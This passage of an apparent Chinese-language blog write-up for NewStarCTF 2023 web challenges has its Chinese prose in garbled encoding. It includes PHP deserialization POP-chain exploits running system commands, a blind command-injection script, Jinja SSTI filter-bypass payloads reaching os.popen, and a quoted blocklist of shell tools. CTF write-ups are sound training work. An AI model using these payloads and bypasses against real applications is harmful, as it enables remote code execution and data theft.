class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª<code>popé“¾</code>æŒºå¥½å†™çš„<br><code>Begin::__destruct()-&gt;Then::__toString()-&gt;Super::__invoke()-&gt;Handle::__call()-&gt;CTF::end()-&gt;WhiteGod::unset()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Then</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Super</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;name-&gt;func = <span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">   <span class="variable">$a</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;<span class="keyword">var</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<h3 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>å¥½å®¶ä¼™ï¼Œä¸€å¼€å§‹è¿˜æƒ³åå¼¹shellï¼Œå±…ç„¶æŠŠæˆ‘<code>.</code>ç»™banäº†ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œå¥½åƒå¯ä»¥æä¸€æ‰‹ï¼Œ<code>&gt;</code>çš„é‡å®šå‘å†™æ–‡ä»¶ä¹Ÿæ²¡äº†ï¼Œè¿™é‡Œçš„<code>exec()</code>å°±ç›¸å½“äºå¸¸ç”¨çš„<code>system()</code>äº†ï¼Œä½†æ˜¯å®ƒæ‰§è¡Œæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥è¦æŠŠè¾“å‡ºå†…å®¹å†™åˆ°æ–‡ä»¶å»<br>ä½¿ç”¨teeå‘½ä»¤ï¼Œå¯ä»¥æŠŠè¾“å‡ºå†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ä¸­ï¼Œä½†æ˜¯è¢«banï¼Œå¾—ç»•è¿‡ä¸€ä¸‹ï¼Œ<code>t&#39;&#39;ee</code>åŒå¼•å·ç»•è¿‡(å•å¼•å·ä¹Ÿæ˜¯å¯ä»¥çš„)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line">   <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="variable">$b</span>;</span><br><span class="line">   <span class="variable">$b</span>-&gt;code = <span class="string">&quot;ls / | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>å…ˆpostä¼ å‚è¿›å»ï¼Œåå†è®¿é—®1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line">   <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="variable">$b</span>;</span><br><span class="line">   <span class="variable">$b</span>-&gt;code = <span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee 2&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>åŒç†è®¿é—®2ï¼Œå®˜æ–¹ç»™çš„é¢„æœŸè§£æ˜¯bashç›²æ³¨ï¼Œæ€ä¹ˆçœ‹å¤§å®¶éƒ½éé¢„æœŸï¼Œæ˜¯ç»™äº†å†™å…¥æƒé™å§<br>æ²¡æœ‰å†™å…¥æƒé™å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œåªèƒ½é€šè¿‡sleepå‘½ä»¤æ ¹æ®æ‰§è¡Œæ—¶é—´æ¥è¿›è¡Œç›²æ³¨<br>å¯ä»¥å‚è€ƒè¿™ä¸ª<br><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/">https://johnfrod.top/ctf/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://547ff780-ad61-4956-b606-ebb9e30e5e52.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="comment"># asciiç è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            k = <span class="built_in">chr</span>(k)</span><br><span class="line">            payload = <span class="string">f&quot;if [ `cat /flag_is_h3eeere | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            length = <span class="built_in">len</span>(payload)</span><br><span class="line">            payload2 = &#123;<span class="string">&quot;payload&quot;</span>: <span class="string">&#x27;O: 7: &quot;minipop&quot;: 2: &#123;&#123;s: 4: &quot;code&quot;; N; s: 13: &quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;s:&#123;0&#125;:&quot;&#123;1&#125;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N; &#125;&#125;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                length, payload)&#125;</span><br><span class="line">            t1 = time.time()</span><br><span class="line">            r = requests.post(url=url, data=payload2)</span><br><span class="line">            t2 = time.time()</span><br><span class="line">            <span class="keyword">if</span> t2-t1 &gt; <span class="number">1.5</span>:</span><br><span class="line">                result += k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p>bydï¼Œè¿™å®˜æ–¹è„šæœ¬æŒºéš¾è·‘çš„ï¼Œè·‘å‡ æ¬¡éƒ½æ²¡è§æœ‰è¾“å‡º</p>
<h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p>åˆ†æç½‘ç»œï¼Œå“åº”å¤´å‘ç°ï¼Œ<code>Pop: /secr3tofpop</code><br>ä¼ å‚<code>name=</code>ï¼Œååº”è¿‡æ¥çš„å·²ç»çŸ¥é“æ˜¯<code>SSTI</code>äº†ï¼Œæ˜¯å§ï¼Œè¿™ä¸ªä¼ å‚å°±æŒºçœ¼ç†Ÿçš„ï¼Œè€Œä¸”ä¼ ä»€ä¹ˆå¾—åˆ°ä»€ä¹ˆ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">éƒ¨åˆ†å­—ç¬¦ä¸²è¢«è¿‡æ»¤äº†ï¼Œ<span class="string">&#x27;ã€&#123;&#123;&#125;&#125;ã€popenã€initã€request</span></span><br><span class="line"><span class="string">&#123;&#123;&#125;&#125;ç”¨&#123;% %&#125;ç»•è¿‡ï¼Œå­—ç¬¦ä¸²è¿˜å¯ä»¥æ‹¼æ¥ï¼Œå•å¼•å·å°±ç”¨åŒå¼•å·ç»•è¿‡</span></span><br><span class="line"><span class="string">è¿™é‡Œæ²¡æœ‰å‡ºç°å›æ˜¾ï¼Œæ‰“å°ä¸€ä¸‹</span></span><br><span class="line"><span class="string">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())  ç„¶åè‡ªå·±æŸ¥æ‰¾&lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;çš„ä½ç½®</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;%print(&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;][&quot;__ba&quot;+&quot;ses__&quot;][0][&quot;__subcl&quot;+&quot;asses__&quot;]()[132][&quot;__in&quot;+&quot;it__&quot;][&quot;__glob&quot;+&quot;als__&quot;][&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;)[&quot;read&quot;]())%&#125;</span></span><br><span class="line"><span class="string">å°±æ‹¼æ¥initä¹Ÿå¯ä»¥çš„</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å…¶å®ï¼Œinitå¯ä»¥ç”¨enterç»•è¿‡</span></span><br><span class="line"><span class="string">&#123;%print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__enter__.__globals__[&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;).read())%&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å®˜æ–¹åˆ©ç”¨å†…ç½®çš„å…¨å±€å‡½æ•°</span></span><br><span class="line"><span class="string">&#123;% print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;).read()) %&#125;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‚è€ƒ<br><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/flaskssti/">https://tyskill.github.io/posts/flaskssti/</a></p>
<h3 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl()"></a>OtenkiGirl()</h3><p>æœ‰ä¸ª<code>hint.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ã€ã€Œroutesã€ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã ã‘ã‚’è¦‹ã¦ãã ã•ã„ã€‚SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã€ã¨å¾¡å‚å¾¡å‚ã¯æœŸå¾…ã«æº€ã¡ãŸæ°—æŒã¡ã§è¨€ã£ãŸã€‚</span><br><span class="line"></span><br><span class="line">â€œåªçœ‹&#x27;routes&#x27;æ–‡ä»¶å¤¹ï¼Œæ²¡æœ‰SQLæ³¨å…¥ã€‚â€ å¾¡å‚å¾¡å‚æ»¡æ€€æœŸå¾…åœ°è¯´é“ã€‚</span><br></pre></td></tr></table></figure>
<p><code>jsåŸå‹é“¾æ±¡æŸ“</code>ï¼Œå¾…è¡¥ingâ€¦â€¦</p>
<!-- <https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#JS%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE>

<https://www.freebuf.com/articles/web/361333.html>

<https://www.freebuf.com/articles/web/375095.html>

blog
<https://c1oudfl0w0.github.io/blog/2023/10/15/NewStarCTF-2023-Week3/#OtenkiGirl-%E5%A4%8D%E7%8E%B0>

<https://blog.csdn.net/m0_73512445/article/details/133694293>

<https://blog.csdn.net/m0_63138919/article/details/133958661> -->
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="é€ƒ"><a href="#é€ƒ" class="headerlink" title="é€ƒ"></a>é€ƒ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])))); www-data www-data </span><br></pre></td></tr></table></figure>
<p>æƒ³åˆ°äº†<code>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</code><br>è¿™é‡Œæ˜¯<code>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿</code></p>
<p>æˆ‘ä»¬éœ€è¦çš„æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:n:<span class="string">&quot;str&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;<span class="string">&quot;s:3:&quot;</span>cmd<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>åªè¦<code>key</code>çš„é•¿åº¦åˆšåˆšå¥½è¦†ç›–åˆ°<code>s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>çš„å‰é¢ï¼Œé‚£ä¹ˆ<code>&quot;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>å°†ä¼šè¢«ä¸¢å¼ƒï¼Œä¸èµ·ä½œç”¨</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>key</code>éœ€è¦ä¼ çš„æ˜¯<code>str&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code></p>
<p>å¯¹<code>key</code>æ¯ä¼ å…¥ä¸€ä¸ª<code>bad</code>ï¼Œç»è¿‡<code>waf</code>ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿å¾—å®ƒçš„å€¼å¢åŠ ä¸€ä¸ªé•¿åº¦ä¾›æˆ‘ä»¬çš„é€ƒé€¸å­—ç¬¦ä½¿ç”¨ï¼Œä»è€Œä½¿å¾—æˆ‘ä»¬é€ƒé€¸çš„å­—ç¬¦å‘åæŒªï¼Œä¸å†å±äº<code>key</code>çš„èŒƒå›´</p>
<p>æ‰€ä»¥ï¼Œä¸€ä¸ª<code>bad</code>å¢åŠ ä¸€ä¸ªé€ƒé€¸å­—ç¬¦ï¼Œéœ€è¦é€ƒé€¸çš„å­—ç¬¦æ˜¯<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>ï¼Œå…±29ä¸ªï¼Œéœ€è¦29ä¸ª<code>bad</code></p>
<p>payload: <code>badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code></p>
<h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br></pre></td></tr></table></figure>
<p>æœ‰<code>PHP GCåƒåœ¾å›æ”¶æœºåˆ¶</code><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD%2FQbyqQqGKprwQC0CeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0</a></p>
<p>ä¸€å¼€å§‹å¡äº†ä¸€ä¸‹ä¸‹ï¼Œæˆ‘è¿˜åœ¨æƒ³æ€ä¹ˆè§¦å‘<code>Crypto::__toString()</code>ï¼Œå…¶å®<code>Start()::__destruct()</code>æ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œ<code>die()</code>æ˜¯ä¼šè¾“å‡ºä¿¡æ¯çš„ï¼Œæˆ‘æœ‰ç‚¹å¿˜è®°äº†</p>
<p>é“¾å­ï¼š<code>Start::__destruct()-&gt;Crypto::__toString()-&gt;Reverse::__get()-&gt;Pwn::__invoke()-&gt;Web::evil()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Web</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">   